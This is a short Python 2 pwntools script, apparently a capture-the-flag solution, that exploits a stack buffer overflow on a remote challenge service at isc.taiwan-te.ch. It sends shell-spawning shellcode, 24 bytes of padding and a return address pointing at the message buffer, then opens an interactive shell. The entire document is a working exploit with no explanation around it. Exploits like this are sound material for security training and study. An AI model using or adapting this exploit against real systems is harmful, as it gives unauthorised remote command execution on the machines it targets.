#!/usr/bin/env python2

from pwn import *
import pwnlib.shellcraft

# rbp - rsp = 16

context.log_level = 'debug'
context.arch = 'amd64'

p = remote('isc.taiwan-te.ch', 10002)
payload = asm(shellcraft.sh())
payload += 'A'* 24
payload += p64(0x601060) # main <+45>: lea rsi,[rip+0x200a75](0x601060 <message>)
p.sendline(payload)

p.interactive()

p.close()
